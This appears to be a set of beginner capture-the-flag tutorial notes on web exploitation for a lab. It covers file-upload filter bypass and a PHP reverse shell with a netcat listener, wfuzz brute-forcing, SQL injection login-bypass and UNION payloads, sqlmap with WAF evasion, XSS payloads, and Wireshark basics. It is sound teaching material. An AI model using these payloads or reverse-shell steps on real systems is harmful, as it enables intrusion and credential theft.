***Web Exploitation A Christmas Crisis***

The Web:

The Internet is one of those things that everyone uses, but few people bother to learn about. As hackers, it is vital that we understand what exactly the web is, and how it works.

When you open up your web browser and navigate to a website, it seems so simple, but what is really happening behind the scenes?
First of all, your computer communicates with a known DNS (Domain Name System) server to find out where the website can be found on the internet. The DNS server will then return an *IP address* for the remote server. This can be used to go directly to the website. You can think of the internet as being quite like the planet itself -- we have lots of locations, all over the world. These places all have a street address -- this is akin to the domain name of a website (i.e. tryhackme.com, or google.com); but they also have co-ordinates which can be used to pinpoint their location with absolute accuracy. These co-ordinates are like the IP address of a website. If you know the street address of a location, you can enter it into Google Maps and be given the exact co-ordinates, which can then be put into a SatNav to take you there with pinpoint accuracy!
In the same way, your browser is given the address of a website (i.e. tryhackme.com). It sends this address off to a DNS server, which tells it the "co-ordinates" (the IP address) of the site. Your computer doesn't understand the original, human-readable domain name, but it does understand what an IP address is! The IP can then be used to find the server across the internet, allowing your computer to request the content of the website. Of course, in reality this is a highly simplified analogy, so a more in depth explanation of this process can be found here.

HTTP(S):

Once your computer knows where it can find the target website, it sends something called a HTTP (Hypertext Transfer Protocol) request to the webserver.

This is just a standard network request, but it is formatted in a way that both your web browser and the server can understand. In practice, this means adding certain "headers" to the request which identify it as a HTTP request, and tell the server a variety of other information about the request, as well as your own browser. Amongst many other headers, HTTP requests always have a method and a target. These specify what to retrieve from the server (the target), and how to retrieve it (the method). The method most commonly used to retrieve information is called the GET method. When sending data to the server, it's more common to use a method called POST.

For more information about HTTP requests, methods and headers, check out the Web Fundamentals room!

Once the content has been retrieved from the server, your browser reads the retrieved code and renders it as a web page. This usually means taking the layout of the page from a HTML (Hyper Text Markup Language) document, styling it with a connected CSS (Cascading Style Sheets) file, then adding any dynamic content with one or more connected Javascript files.

HTTP has one inherent disadvantage: namely, it is not secure. Anyone can see what you're requesting, and what's being sent back to you. For this reason HTTPS (Hypertext Transfer Protocol Secure) was invented. This works in exactly the same way as standard HTTP, but provides an encrypted connection (the functionality of which is beyond the level of this dossier

Cookies:

HTTP is an inherently stateless protocol. This means that no data persists between connections; your computer could make two requests immediately after each other, and, without relying on separate software, the web server would have no way to know that it was you making both the requests. This begs the important question: if HTTP is stateless, then how to login systems work? The webserver must have a way to identify that you have the right level of access, and it can hardly ask you to enter your password every time you request a new page!

The answer is cookies -- tiny little pieces of information that get stored on your computer and get sent to the server along with every request that you make. Authentication (or session) cookies are used to identify you (these will be very important in your mission today!). The server receives your request with the attached cookie, and checks the cookie to see what level of access you are allowed to have. It then returns a response appropriate to that level of access.

For example, a standard user should be able to see (but not interact with) our control panel; but Santa should be able to access everything! Cookies are also often used for other purposes such as advertising and storing user preferences (light/dark theme, for example); however, this will not be important in your task today. Any site can set cookies with a variety of properties -- the most important of these for today's task are the name and value of the cookies, both of which will always be set. It's worth noting that a site can only access cookies that are associated with its own domain (i.e. google.com can't access any cookies stored by tryhackme.com, and vice versa).



It's important to note that cookies are stored locally on your computer. This means that they are under your control -- i.e. you can add, edit, or delete them as you wish. There are a few ways to do this, however, it's most commonly done by using your Browser Developer Tools, which can be accessed in most browsers by pressing F12, or Ctrl + Shift + I. With the developer tools open, navigate to the Storage tab in FireFox, or the Application tab in Chrome/Edge and select the Cookies menu on the left hand side of the console.



In the above image you can see a test cookie for a website. The important attributes "Name" and "Value" are shown. The name of a cookie is used to identify it to the server. The value of the cookie is the data stored by the server. In this example the server would be looking for a cookie called "Cookie Name". It would then retrieve the value "CookieValue" from this cookie.

These values can be edited by double clicking on them, which is great if you can edit a session or authorisation cookie, as this can lead to an escalation of privileges, assuming you have access to an Administrator's authorisation cookie.

Having read the lengthy dossier,  you get ready to hack your way back into Santa's Christmas Control Centre! You enter the IP address at the top of the screen into your browser search bar and press enter to load the page.


***﻿GET Parameters and URLs***

We looked briefly at the differences between GET and POST requests in the previous dossier; however, the emphasis was on the POST requests used in a login form. The server you'll be testing today employs a concept called "GET parameters". Just as POST requests can be used to send information to the server, so too can GET requests be used; however, there is one important difference. With POST requests the data being sent is included in the "body" of the request. With GET requests, the data is included in the URL as a "parameter". This is best demonstrated with an example:

https://www.thebestfestivalcompany.co.uk/index.php?snack=mincePie

(Please Note: this site is completely fictitious. It does not exist, and connecting to it is not part of the task)

There are 7 different parts which make up this URL. Let's look at each of them in turn:


    First up we have the protocol (https://). This specifies whether the request should be made using HTTP, or HTTPS. In our example, we are using HTTPS.
    Next we have the subdomain (www). This is traditionally "www" (World Wide Web) to signify that the target is a website; however, this is not essential. Indeed, subdomains can be basically anything you want; for example, a lot of websites use things like "assets", or "api" to indicate different subdomains with different uses. (e.g. https://api.thebestfestivalcompany.co.uk)
    The next part of the URL is the domain (thebestfestivalcompany). Domains need to be registered and are used as links between a memorable word or phrase, and an IP address. In other words, they're used to give a name to the server running a website.
    Next up we have the TLD (Top Level Domain) -- .co.uk, for our example. Top-level domains are used by DNS to determine where to look if they want to find your domain. Previously top-level domains had specific uses (and many still do!), but this is not always the case these days. For example, .co.uk  indicates a company based in the UK, .com indicates a company based in the US.
    We then have the resource that we're selecting -- in this case that is the homepage of the website: index.php. As a side note, all homepages must be called "index" in order to be correctly served by the web server without having to be specified fully, unless this parameter has been changed from the default in the webserver configuration. This is how you can go to [https://tryhackme.com](https://tryhackme.com) without having to specify that you want to receive the home page -- the index page is served automatically because you didn't specify!
    The final two aspects of the URL are the most important for our current topic: they both relate to GET parameters. First up we have ?snack=. Here ? is used to specify that a GET parameter is forthcoming. We then have the parameter name: snack. This is used to identify the parameter to the server. We then have an equals sign (=), indicating that the value will come next.
    Finally, we have the value of the GET parameter: mincePie, because who doesn't like mince pies, right?

It's important to note exactly which part of the URL is the GET parameter. Specifically, we are talking about ?snack=mincePie. If there was more than one parameter, we would separate them with an ampersand (&). For example: ?snack=mincePie&drink=hotChocolate. In this way we can send multiple values to the server, distinguished by keys (i.e. "mincePie" is identified by the key: "snack").

***File Uploads***

There are countless uses for file uploads in the modern internet -- profile pictures, school/university submissions, diagrams, pictures of your dog, you name it! Whilst file uploads are very common, they're also very easy to implement in an insecure fashion. For this reason, it's important that we understand the gravity of the attack vector.

When you have the ability to upload files to a server, you have a path straight to RCE (Remote Command Execution). An upload form with no restrictions would mean that you could upload a script that, when executed, connects back to your attacking machine and gives you the ability to run any command you want. It would be very unusual to find a file upload with no filtering; but it's much less uncommon to find a file upload that employs flawed filtering techniques which can be circumvented to upload a malicious script. The script has to be written in a language which the server can execute. PHP is usually a good choice for this, as most websites are still written with a PHP back end.

There isn't time to go over every kind of filter bypass in this task (there is literally an entire room on this topic, which is recommended for further practice). Instead, we'll just cover one of the most common types of filter and its bypass:

    File Extension Filtering: As the name suggests extension filtering checks the file extension of uploaded files. This is often done by specifying a list of allowed extensions, then checking the uploaded file against the list. If the extension is not in the allowlist, the upload is rejected.
    So, what's the bypass? Well, the answer is that it depends entirely on how the filter is implemented. Many extension filters split a filename at the dot (.) and check what comes after it against the list. This makes it very easy to bypass by uploading a double-barrelled extension (e.g. .jpg.php). The filter splits at the dot(s), then checks what it thinks is the extension against the list. If jpg is an allowed extension then the upload will succeed and our malicious PHP script will be uploaded to the server.

When implementing an upload system, it's good practice to upload the files to a directory that can't be accessed remotely. Unfortunately, this is often not the case, and scripts are uploaded to a subdirectory on the webserver (often something like /uploads, /images, /media, or /resources). For example, we might be able to find the uploaded script at https://www.thebestfestivalcompany.co.uk/images/shell.jpg.php.

***Reverse Shells***

Let's assume that we've found somewhere to upload our malicious script, and we've bypassed the filter -- what then? There are a few paths we can take: the most common of which is uploading a reverse shell. This is a script that creates a network connection from the server, to our attacking machine. The majority of webservers are written with a PHP back end, which means we need a PHP reverse shell script -- there happens to be one already on Kali/AttackBox at /usr/share/webshells/php/php-reverse-shell.php (Note: if you're not using Kali or the provided AttackBox, the same script can be found here.

    Copy the webshell out into your current directory (cp /usr/share/webshells/php/php-reverse-shell.php .), then open it with your text editor of choice.
    Scroll down to where it has $ip and $port (both marked with // CHANGE THIS). Set the IP to your TryHackMe IP Address (which can be found in the green bubble on the navbar, if you're using the AttackBox, or by running ip a show tun0 if you're using your own Linux VM with the OpenVPN connection pack) -- making sure to keep the double-quotes. Set the port to 443 with no double quotes, then save and exit the file. Congratulations, you now have a fully configured PHP reverse shell script!


***Reverse Shell Listeners***

We've spoken at length about reverse shell listeners, but what are they? In short, a reverse shell listener is used to open a network socket to receive a raw connection -- like the one created by a reverse shell being executed! The simplest form of listener is created by using a program called netcat, which is installed on both Kali and the AttackBox by default. We can create a listener for an uploaded reverse shell by using this command: sudo nc -lvnp 443. This essentially creates a listener on port 443. In a real-world environment, you would want to use a common port such as 443 that is not filtered by firewalls in most scenarios, increasing the chances our reverse shell connects back.. Once netcat has been setup, our reverse shell will be able to connect back to this when activated.

The full explanation can be found in the Intro to Shells room linked above, if you're interested.

Putting it all together

This was a lot of information, so let's put it all together and look at the full process for exploiting a file upload vulnerability in a PHP web application:

    Find a file upload point.
    Try uploading some innocent files -- what does it accept? (Images, text files, PDFs, etc)
    Find the directory containing your uploads.
    Try to bypass any filters and upload a reverse shell.
    Start a netcat listener to receive the shell
    Navigate to the shell in your browser and receive a connection!

***Authentication***

Authentication is a process of verifying a users' identity, normally by credentials (such as a username, user id or password); to put simply, authentication involves checking that somebody really is who they claim to be. Authorization (which is fundamentally different to authentication, but often used interchangeably) determines what a user can and can't access; authorization is covered in tomorrow walkthrough, today's task focuses on authentication and some common flaws.

***Default Credentials***

You've probably purchased (or downloaded a service/program) that provides you with a set of credentials at the start and requires you to change the password after it's set up (usually these credentials that are provided at the start are the same for every device/every copy of the software). The trouble with this is that if it's not changed, an attacker can look up (or even guess) the credentials.

What's even worse is that these devices are often exposed to the internet, potentially allowing anyone to access and control it. In 2018 it was reported that a botnet (a number of internet-connected devices controlled by an attacker to typically perform DDoS attacks) called Mirai took advantage of Internet of Things (IoT) devices by remotely logging, configuring the device to perform malicious attacks at the control of the attackers; the Mirai botnet infected over 600,000 IoT devices mostly by scanning the internet and using default credentials to gain access.

In fact, companies such as Starbucks and the US Department of Defense have been victim to leaving services running with default credentials, and bug hunters have been rewarded for reporting these very simple issues responsibly (Starbucks paid $250 for the reported issue):

    https://hackerone.com/reports/195163 - Starbucks, bug bounty for default credentials.
    https://hackerone.com/reports/804548 - US Dept Of Defense, admin access via default credentials.

In 2017, it was reported that 15% of all IoT devices still use default passwords.

SecLists is a collection of common lists including usernames, passwords, URLs and much more. A password list known as "rockyou.txt" is commonly used in security challenges, and should definitely be a part of your security toolkit.


***What is Fuzzing?***

To keep it simple, fuzzing can be argued as "fancy bruteforcing" to some degree. However, you can fuzz what you can't bruteforce. Fuzzing is using security tools to automate the input of data we provide into things such as websites or software applications. Fuzzing is an extremely effective process as computers can perform laborious actions like trying to find hidden files/folders, try different username and passwords much quicker then a human can (and is willing to do...)

Poorly built applications are often unable to handle data the way it is supposed to under intense load. Moreover, the data we're parsing to the application may be interpreted and executed (instead of being handled correctly i.e. system commands). We can use fuzzing to cause the application to trigger what's known as an error condition where this may be abused by a penetration tester or a bug bounty hunter.


***An Introduction to Using wfuzz***

The premise behind wfuzz is simple. Occasionally you want a bit more information about how much data something within a web application returns. This could be anything from a file, a response code (i.e. 404 meaning the URL doesn't exist) or the parameters used in a form similar to the form you attacked in Day 2.

For example, let's say you are pentesting a note-taking application and you want to see if you can view notes by other users. One way you may want to achieve this is by FUZZing for usernames (with the knowledge that every valid user will have note.txt by default). Our wfuzz command would like the following: wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt localhost:80/FUZZ/note.txt

Now wfuzz will query the webserver using the words iterated from the "big.txt" wordlist. To illustrate:

    Query #1: http://localhost/admin/note.txt
    Query #2: http://localhost/administrator/note.txt
    Query #3: http://localhost/system/note.txt


Note how the "FUZZ" parameter is being replaced with the words from the wordlist. We'll outline some of the options that can be configured in wfuzz, however, it's worth knowing that will display results that are different to the parameters that we set. In the picture above we used the --hwoption to hide all pages that have 57 words on them. Since wfuzz found a URL with only 8 words, it'll be displayed to us, as this is not 57 words.

    It is important to know that you can FUZZ any part of the URL, meaning that you can test any parameters if you don't know them as well.

As with any Linux-based tool, wfuzz also has a useful manpage here, that details some of the more advanced options available to you. Although, I have added some of the more useful options into the table below:
Options 	Description
	-c 	Shows the output in color
	-d 	Specify the parameters you want to fuzz with, where the data is encoded for a HTML form
	-z 	Specifies what will replace FUZZ in the request. For example -z file,big.txt. We're telling wfuzz to look for files by replacing "FUZZ" with the words within "big.txt"
	--hc 	Don't show certain http response codes. I.e. Don't show 404 responses that indicate the file doesn't exist, or "200" to indicate the file does exist
	--hl 	Don't show for a certain amount of lines in the response
	--hh 	Don't show for a certain amount of characters


Let's bring this together and demonstrate some of these options. Let's say we wanted to fuzz an application on http://shibes.thm/login.php to find the correct credentials to the login form. After recalling our knowledge from Day 2, we know all about URL parameters! We can take a bit of a guess as to what parameters the login form may be using username and password, right? Worth a try! Our wfuzz command would look like so: wfuzz -c -z file,mywordlist.txt -d “username=FUZZ&password=FUZZ” -u http://shibes.thm/login.php

Where wfuzz will now iterate through the wordlist we provided and replace the "FUZZ" values specified in the "username" and "password" parameters.



***What is SQL Injection?***

A SQL injection (SQLi) attack consists of the injection of a SQL query to the remote web application. A successful SQL injection exploit can read sensitive data from the database (usernames & passwords), modify database data (Add/Delete), execute administration operations on the database (such as shutdown the database), and in some cases execute commands on the operating system.
SQL Background

SQL is a language used in programming to talk to databases. It's an extremely handy language that makes it easy for the developers to organise data in various structures. Unfortunately, the benefit always comes with a drawback; even a little misconfiguration in SQL code can lead to a potential SQL injection.

I advise you to quickly go through this SQL command guide in order to make yourself familiar with them:

List of SQL Commands | Codecademy

In any case, in the SQL Injection attack, we mainly use only 4 commands: SELECT, FROM, WHERE, and UNION.
SQL Command 	Description
SELECT 	Used to select data from a database.
FROM 	Used to specify which table to select or delete data from.
WHERE 	Used to extract only those records that fulfil a specified condition.
UNION 	Used to combine the result-set of two or more SELECT statements.

It is important to mention that 1=1 in SQL stands for True (shortly you'll see the reason as to why I mention this).
How does an SQLi attack work?

SQLi is carried out through abusing a PHP GET parameter (for example ?username=, or ?id=) in the URL of a vulnerable web page, such as those covered in Day 2. These are usually located in the search fields and login pages, so as a penetration tester, you need to note those down.

Here's an example of a username input field written in PHP:

<?php
    $username = $_GET['username'];
    $result = mysql_query("SELECT * FROM users WHERE username='$username'");
?>

After a variable username was inputted in the code, PHP automatically uses SQL to select all users with the provided username. Exactly this fact can be abused by an attacker.

Let's say a malicious user provides a quotation mark (') as the username input. Then the SQL code will look like this:

SELECT * FROM users WHERE username='''

As you can see, that mark creates a third one and generates an error since the username should only be provided with two. Exactly this error is used to exploit the SQL injection.

Generally speaking, SQL injection is an attack in which your goal is to break SQL code execution logic, inject your own, and then 'fix' the broken part by adding comments at the end.



Graphical interpretation

Most commonly used comments for SQLi payloads:

--+

//

/*

***Login Bypass with SQL Injection***

One of the most powerful applications of SQL injection is definitely login bypassing. It allows an attacker to get into ANY account as long as they know either username or password to it (most commonly you'll only know username).

First, let's find out the reason behind the possibility to do so. Say, our login application uses PHP to check if username and password match the database with following SQL query:

SELECT username,password FROM users WHERE username='$username' and password='$password'

As you see here, the query is using inputted username and password to validate it with the database.

What happens if we input ' or true -- username field there? This will turn the above query into this:

SELECT username,password FROM users WHERE username='' or true -- and password=''

The -- in this case has commented out the password checking part, making the application forget to check if the password was correct. This trick allows you to log in to any account by just putting a username and payload right after it.

Note that some websites can use a different SQL query, such as:

SELECT username,pass FROM users WHERE username=('$username') and password=('$password')

In this case, you'll have to add a single bracket to your payload like so: ') or true– to make it work.

You can practice login bypassing on a deployed machine, port 3000 (First browse to 10.10.252.167:3000/init.php and then to 10.10.252.167:3000). I've put an extra interactive exercise there. It'll show you all back end output, allowing you to experiment and practice with SQL commands.
Blind SQL Injection

In some cases, developers become smart enough to mitigate SQL Injection by restricting an application from displaying any error. Happily, this does not mean we cannot perform the attack.
Blind SQL Injection relies on changes in a web application, during the attack. In other words, an error in SQL query will be noticeable in some other form (i.e changed content or other).

Since in this situation we can only see if an error was produced or not, blind SQLi is carried out through asking 'Yes' or 'No' questions to the database (Error = 'No', No Error = 'Yes').
Through that system, an attacker can guess the database name, read columns and etc. Blind SQLi will take more time than other types but can be the most common one in the wild.

Start off with finding a way to cause the SQL error and then fixing it back.


***Breaking the application***

Fixing it - Notice how the app did not output any error, even though I've clearly caused an SQL error.

For asking the questions, you can use SUBSTR() SQL function. It extracts a substring from a string and allows us to compare the substring to a custom ASCII character.

substr((select database()),1,1)) = 115

The above code is asking the database if its name's first letter is equal to 155 ('s' in ASCII table).

Now put this into a payload:

?id=1' AND (ascii(substr((select database()),1,1))) = 115 --+

The payload is the question. If the application does not produce any changes, then the answer is 'Yes' (the database's first letter is 's'). Any error or change = 'No'.


Note: You can use blind SQLi injection techniques in the 'open' situation too.
UNION SQL Injection

UNION SQLi is mainly used for fast database enumeration, as the UNION operator allows you to combine results of multiple SELECT statements at a time.

UNION SQLi attack consists of 3 stages:

    Finding the number of columns
    Checking if the columns are suitable
    Attack and get some interesting data.

    Determining the number of columns required in an SQL injection UNION attack

There are exactly two ways to detect one:

The first one involves injecting a series of ORDER BY queries until an error occurs. For example:

' ORDER BY 1--

' ORDER BY 2--

' ORDER BY 3--

# and so on until an error occurs

(The last value before the error would indicate the number of columns.)

The second one (most common and effective), would involve submitting a series of UNION SELECT payloads with a number of NULL values:

' UNION SELECT NULL--

' UNION SELECT NULL,NULL--

' UNION SELECT NULL,NULL,NULL--

# until the error occurs

No error = number of NULL matches the number of columns.

    Finding columns with a useful data type in an SQL injection UNION attack

Generally, the interesting data that you want to retrieve will be in string form. Having already determined the number of required columns, (for example 4) you can probe each column to test whether it can hold string data by replacing one of the UNION SELECT payloads with a string value. In case of 4 you would submit:

' UNION SELECT 'a',NULL,NULL,NULL--

' UNION SELECT NULL,'a',NULL,NULL--

' UNION SELECT NULL,NULL,'a',NULL--

' UNION SELECT NULL,NULL,NULL,'a'--

No error = data type is useful for us (string).

    Using an SQL injection UNION attack to retrieve interesting data

When you have determined the number of columns and found which columns can hold string data, you can finally start retrieving interesting data.

Suppose that:

    The first two steps showed exactly two existing columns with useful datatype.
    The database contains a table called users with the columns username and password.

In this situation, you can retrieve the contents of the user's table by submitting the input:

' UNION SELECT username, password FROM users --

Here's a small list of thing you'd want to retrieve:

    database()
    user()
    @@version
    username
    password
    table_name
    column_name

***SQLMap***

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It's an incredible tool that can be learned within minutes. It's already included in THM's AttackBox or you can install it locally by running:

git clone --depth 1 <https://github.com/sqlmapproject/sqlmap.git> sqlmap-dev

Here are some of the most common options that you would configure when using SQLMap:
Command 	
--url 	Provide URL for the attack
--dbms 	Tell SQLMap the type of database that is running
--dump 	Dump the data within the database that the application uses
--dump-all 	Dump the ENTIRE database
--batch 	SQLMap will run automatically and won't ask for user input

Let's show an example of an SQLMap command. Let's say we have a vulnerable login form located at "http://tbfc.net/login.php". (Note, this is just an example, please do not SQLMap this website as no consent has been given by the owner.) We would use this alongside --url to tell SQLMap where to attack. i.e. sqlmap --url http://tbfc.net/login.php

Where we can then proceed to enumerate what data is in the application's database with options such as --tables and --columns. Leaving our final SQLMap looking like so: sqlmap --url http://tbfc.net/login.php --tables --columns

Again, tbfc.net is given as an example, please do not perform any attack on this site.

    You can find a cheatsheet for more snippets of SQLMap commands here

***SQLMap & BurpSuite***

The most beneficial feature of sqlmap is its integration with BurpSuite.

With BurpSuite, you can capture and save login or search information to use with SQLMap. This is done by intersecting a request. You will need to configure your browser to use BurpSuite as a proxy for this request to capture. The AttackBox has made this simple for you by using the FoxyProxy extension in Firefox.

    First let's startup BurpSuite located in "Applications -> Web -> BurpSuite Community Edition" on the AttackBox
    Use Firefox to visit the application we suspect to be vulnerable
    Enable FoxyProxy in Firefox:
    Submit a request on the web application we suspect to be vulnerable
    Send the request from the "Proxy" tab to the repeater by right-clicking and pressing "Send to Repeater"
    Notice our request is now in the "Repeater" tab:
    Finally, save this request by right-clicking and pressing "Save item"

We can then use this request in SQLMap:

sqlmap -r filename

SQLMap will automatically translate the request and exploit the database for you.
Challenge

Visit the vulnerable application in Firefox, find Santa's secret login panel and bypass the login. Use some of the commands and tools covered throughout today's task to answer Questions #3 to #6.

Santa reads some documentation that he wrote when setting up the application, it reads:

Santa's TODO: Look at alternative database systems that are better than sqlite. Also, don't forget that you installed a Web Application Firewall (WAF) after last year's attack. In case you've forgotten the command, you can tell SQLMap to try and bypass the WAF by using --tamper=space2comment


***What is XSS?***

Cross-site scripting (XSS) is a web vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, and carry out any actions that the user is able to perform. If the victim user has privileged access within the application (i.e admin), then the attacker might be able to gain full control over all of the application's functionality and data. Even if a user is a low privileged one, XSS can still allow an attacker to obtain a lot of sensitive information.
Why does it work like that?

XSS is exploited as some malicious content is being sent to the web browser, often taking the form of JavaScript payload, but may also include HTML, Flash, or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but all of them come down to exactly two types: stored and reflected.
Types of XSS

Stored XSS works when a certain malicious JavaScript is submitted and later on stored directly on the website. For example, comments on a blog post, user nicknames in a chat room, or contact details on a customer order. In other words, in any content that persistently exists on the website and can be viewed by victims.

<!-- Normal comment-->
<p>
     Your comment goes here
</p>

<!--Malicious comment-->

<p>

     <script>

         evilcode()

     </script>

</p>

Let's say we have a website with comments (Code above).  A normal comment is put under <p></p> tags and displayed on the website. A malicious user can put <script></script> tags in that field to execute the evilcode() function every time a user sees this comment.

Stored XSS gives an attacker an advantage of 'injecting' malicious JavaScript behind images. By using <img> attribute it is possible to execute custom JS code when the image is viewed or clicked. For example:

<img src='LINK' onmouseover="alert('xss')">

In this case, an attacker embeds an image that is going to execute alert('xss') if the user's mouse goes over it.

Say we have a web application that allows users to post their comments under the post.


An attacker can exploit this by putting an XSS payload instead of their comments and force everyone to execute a custom javascript code.
This is what happens if we use the above <img> payload there:


A malicious picture executes a custom alert('xss') once being viewed. This is the most common example of stored XSS.

Reflected is another type of XSS that is carried out directly in the HTTP request and requires the attacker to do a bit more work. An example of this could be malicious javascript in the link or a search field. The code is not stored on the server directly, meaning that a target user should compromise himself by clicking the link.

Here's a quick example of an URL with malicious javascript included:

<https://somewebsite.com/titlepage?id=> <script> evilcode() </script>

Any user that clicks on the link is going to execute the evilcode() function, eventually falling under the XSS attack.

Let's say a website is using a query string keyword in its URL 10.10.100.27/reflected?keyword=hello like so:


A search query is put after this keyword parameter. The XSS can be exploited by putting a payload instead of the search query.
The url starts with 10.10.100.27/reflected?keyword=. By adding text onto the keyword, we can perform reflected XSS like 10.10.100.27/reflected?keyword=<script>alert(1)</script> which results in an alert box with 1 on our screen.

Bingo! The XSS was successfully exploited!

***How to detect XSS?***

Both reflected and stored XSS vulnerabilities can be detected in a similar way: through the use of HTML tags, such as <h1></h1>, <b></b> or others. The idea is to try out inputting text with those tags and see if that produces any differences. Any change in text size or color immediately indicates an XSS vulnerability.

But sometimes, it might be challenging to find them manually, and of course, we cannot forget about the basic human error. Happily, there's a solution for that! OWASP ZAP is an open-source web application security scanner. It can automatically detect web vulnerabilities.
You can launch ZAP by going to 'Applications -> Web -> Owasp Zap' on the attack box:

You'll see a fairly simple interface upon the launch.

On the right, you can see a button titled 'Automated scan'. Click it and it'll take you to the attack configuration page.

Now, simply put the target URL in the 'URL to attack' field and press 'Attack'!
After some time, all the vulnerabilities will be displayed in the 'Alerts' tab:


***Bonus: Mitigating XSS***

The rule is simple: all user input should be sanitized at both the client and server-side so that potentially malicious characters are removed. There are libraries to help with this on every platform.




***What is an IP Address?***

You'll hear talk of the term "IP address" frequently throughout the information technology field - not just TryHackMe. Short for an Internet Protocol address, I like to explain this fundamental of networking using the same way that a postal/mail system works in real life.

When sending a letter, you must provide the address for where the letter should go, and it is best practice to include your address as the return address in case the letter is lost (or you wish to let the recipient know how to reply). An IP address serves the same purpose but for devices connected to a network! Devices connected to the internet will have two of these addresses -a public and a private address. Think of a private address as the name of the recipient at a business i.e. Joe Smith, and the public address being the location of this business i.e. 160 Kemp Road, London.

Let's say you are accessing the Internet through your computer. Your computer will be a part of two networks, and in turn, will use both public and private IP address:

    A private IP address to identify itself amongst other devices (such as smartphones, TV's and other computers) within the network of your house. In the screenshot below, the two devices have the following private IP address:


Device Name 	    IP Address 	     IP Address Type
DESKTOP-KJE57FD    192.168.1.77 	   Private
CMNatic-PC 	       192.168.1.74 	   Private



TryHackMe similarly uses these private addresses. For you to access other TryHackMe devices such as the instances that you deploy in this room, you will need to be on the same private network as these instances are not connected to the internet. This is why you must use a client such as OpenVPN to connect to the network.

MuirlandOracle explains how these private IP addresses work in his Intro to Networking room.

    A public IP address was given by your Internet Service Provider (ISP) that identifies your house on the Internet (the Internet is just many, many networks connected). Using our example from above, the two devices will share a public IP address to identify themselves on the Internet:


Device Name 	     IP Address 	     IP Address Type
DESKTOP-KJE57FD 	86.157.52.21 	       Public
CMNatic-PC 	        86.157.52.21 	       Public

This is achieved through NATting, however, detailing how this works exactly this works is a bit beyond the scope of today.

***Protocols 101***

With the internet predicted to have 50 billion devices connected by the end of 2020 (https://www.cisco.com/c/dam/en_us/about/ac79/docs/innov/IoT_IBSG_0411FINAL.pdf), chaos quickly ensues if there are no ground-rules in how devices should communicate with each other.



If this is a bit confusing - I don't blame you, just bear with me here. Think of it this way: You use protocols in everyday life! When talking to someone, you will both use the same set of protocols...otherwise, no one will understand each other. At the very least, all parties wishing to converse will use the same language - this is a protocol! Other protocols may also include the context or topic of the conversation. If anyone strays from these protocols - they risk not being understood! This is the same for network-connected devices.

    Back to the technical stuff...

Enter protocols such as the TCP/IP & UDP/IP models. With TCP/IP being the most common-place today, we'll discuss this further. TCP/IP is a protocol that ensures that any data sent is processed in the same order. Going back to our postal system, your letter will go to many places - even when sending domestically. Your computer traffic does the same, going from device to device in a process called routing. One device could deliver data quicker (and a result, in a different order) then another causing a headache for the situation where accuracy is important such as the following:

    Downloading files
    Visiting a website in your browser
    Sending emails

This is unlike the UDP protocol where having all packets is not quite as important (making the protocol a lot quicker than TCP/IP) which is why applications like video streaming make use of UDP (i.e. Skype). We don't really care if a few packets are lost as we can still see a majority of the picture.

How does TCP/IP send data? The Three-Way Handshake:

The three-way handshake is the method that makes TCP reliable. Any data that is sent is given a random number sequence and is reconstructed using this number sequence and incrementing by 1. Both computers must agree on the same number sequence for data to be sent in the correct order. This order is agreed upon during three steps.

In the diagram below, "Client" has the initial sequence number (ISN) of "0" where the "Server" has "5,000". Any data sent from "Client" and received on "Server" will be initial sequence + 1. If this is the first packet from "Client" this would be "0 + 1". I've shown three packets being sent from "Client" in the table below to help demonstrate this:
Device 	Initial Sequence Number (IN) 	Final Sequence Number 	
Client (Sender) 	0 	0 + 1 = 1 	
Client (Sender) 	1 	1 + 1 = 2 	
Client (Sender) 	2 	2 + 1 = 3 	


    SYN - Client: Here's my initial number sequence (ISN) to SYNchronise with (0)
    SYN/ACK - Server: Here my Initial Number Sequence (ISN) to SYNchronise with (5,000) and I ACKnowledge your initial number sequence (0)
    ACK - Client: I ACKnowledge your Initial Number Sequence (ISN) of (5,000) here is some data that is my ISN+1

When the data is received, it is reassembled by the receiver. Let's show the conditions of which reassembly is required:
Examples of TCP reassembling data:
No reassembly required:

If the "Server" were to receive data that was received in the exact order it was sent from "Client":

    Sent 1st - Received 1st
    Sent 2nd - Received 2nd
    Sent 3rd - Received 3rd

Then no reassembly is needed as the data is received in the exact order it was sent.

Reassembly required:

For example, if the "Server" was to receive all the data, but in a different order then what was sent, reassembly is required:

    Sent 1st - Received 1st
    Sent 2nd - Received 3rd
    Sent 3rd - Received 2nd

Because all data is received, just in a different order, it can be reassembled using the agreed sequence numbers that would have been exchanged during the three-way-handshake.

The connection is dropped:

If the "Client" was to send three packets, but the "Server" only receives two out of three packets, they are disconnected from each other as the data sent is corrupt:

    Sent 1st - Received 1st
    Sent 2nd - Not received
    Sent 3rd - Received 2nd

The data will not be processed by "Server" as the packet that was sent 2nd by the "Client" was never received by the "Server"#2, meaning there was a loss of data along the way.


***Crash Course in Monitoring Network Traffic:***

Being able to capture exactly what is travelling across a network and understanding this is an important skill in information technology. From diagnosing to capturing credentials, positions in IT ranging from system administrators to digital forensics and us pentesters all use network traffic in their own ways. For example, since data sent via HTTP or FTP is unencrypted, a pentester might be able to capture usernames and passwords being entered into a website.

***Introducing Wireshark:***

Networks are, however, rather noisy...Wireshark captured 2,648 packets after a single minute on my machine. This makes analysing very hard. Thankfully, we can use filters to narrow down the results. We can filter by many things, but we'll only cover a couple of important ones in the table below. Note that all the examples below use the == operator to see if the filter exactly matches the value we give it.
Filter 	Description 	Example
ip.src 	Show all packets that originate from the specified IP address 	ip.src == 192.168.1.1
ip.dst 	Show all packets that are destined to the specified IP address 	ip.dst == 192.168.1.1
tcp/udp.port 	Show all packets that are sent via the protocol and port specified 	tcp.port == 22 / udp.port == 67
protocol.request.method 	Show all packets that use a specific method of the protocol given. For example, HTTP allows for both a GET and POST to retrieve and submit data accordingly. 	http.request.method == GET / POST

In the screenshot below, I used the filter ip.src to list all the packets that were explicitly sent from a specific address, using the == operator to define what host I wish to search for (145.254.160.237). We'll quickly explore the use of these operators in the next section.



Combining Filters With Operators
Operator 	Description 	Example
== 	You'd use this operator to check if the filter exactly matches the value given in all packets 	ip.addr == 192.168.1.1 will show all packets with the IP address 192.168.1.1 (this could be source or destination)
!= 	This operator checks if the filter does not match the value given in all packets 	ip.addr != 192.168.1.10 will show all packetsthat does not include the IP address 192.168.1.10 (this could be source or destination)
